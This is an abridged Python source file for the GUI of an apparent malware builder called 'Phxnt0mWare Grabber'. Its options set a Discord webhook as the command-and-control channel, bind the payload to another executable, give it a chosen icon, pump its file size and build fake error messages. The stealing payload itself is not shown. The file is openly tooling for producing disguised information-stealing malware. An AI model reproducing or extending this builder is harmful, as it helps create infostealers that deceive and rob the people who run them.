...
class BuilderOptionsFrame(ctk.CTkFrame):
	...
	def __init__(self, master) -> None:
		...
		self.C2ModeButtonControl = ctk.CTkButton(self, text= "C2: Discord", height= 38, font= self.font, fg_color= "#2E2C2C", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.C2ModeButtonControl_Callback)
		self.C2ModeButtonControl.grid(row= 1, column= 5, sticky= "ew", padx= (0, 15))

		self.bindExeButtonControl = ctk.CTkButton(self, text= "Bind Executable", height= 38, font= self.font, fg_color= "#2E2C2C", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.bindExeButtonControl_Callback)
		self.bindExeButtonControl.grid(row= 2, column= 5, sticky= "ew", padx= (0, 15))

		self.selectIconButtonControl = ctk.CTkButton(self, text= "Select Icon", height= 38, font= self.font, fg_color= "#2E2C2C", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.selectIconButtonControl_Callback)
		self.selectIconButtonControl.grid(row= 3, column= 5, sticky= "ew", padx= (0, 15))

		self.buildModeButtonControl = ctk.CTkButton(self, text= "Output: EXE File", height= 38, font= self.font, fg_color= "#2E2C2C", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.buildModeButtonControl_Callback)
		self.buildModeButtonControl.grid(row= 4, column= 5, sticky= "ew", padx= (0, 15))

		self.consoleModeButtonControl = ctk.CTkButton(self, text= "Console: None", height= 38, font= self.font, fg_color= "#2E2C2C", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.consoleModeButtonControl_Callback)
		self.consoleModeButtonControl.grid(row= 5, column= 5, sticky= "ew", padx= (0, 15))

		self.buildButtonControl = ctk.CTkButton(self, text= "Build", height= 38, font= self.font, fg_color= "#181616", hover_color= "#878787", text_color_disabled= "grey", command= self.buildButtonControl_Callback)
	...
	def testC2ButtonControl_Callback(self) -> None:
		...
		def check():
			if self.C2Mode == 0:
				...
				data = json.dumps({"content" : "Your phantom webhook is working!"})
...
class PumperSettings(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		...
		self.title("Phxnt0mWare Grabber [File Pumper]")
		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "oni.ico")))
		self.grab_set()
...
class FakeErrorBuilder(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		super().__init__(master)
		self.title("Phxnt0mWare Grabber [Fake Error Builder]")
		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "oni.ico")))
		self.grab_set()
...
class Builder(ctk.CTk):
	...
	def __init__(self) -> None:
		...
		self.title("Phxnt0mWare Grabber [Builder]")
		self.iconbitmap(os.path.join("Extras", "oni.ico"))
		...
		self.titleLabel = ctk.CTkLabel(self, text= "Phxnt0mWare", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#878787")
...
if __name__ == "__main__":
	...
	if os.name == "nt":
		...
		if Utility.CheckForUpdates():
			...
			if response:
				webbrowser.open_new_tab("https://www.youtube.com/watch?v=H1pNeOKQbXA&list=RDH1pNeOKQbXA&start_radio=1")
				exit(0)
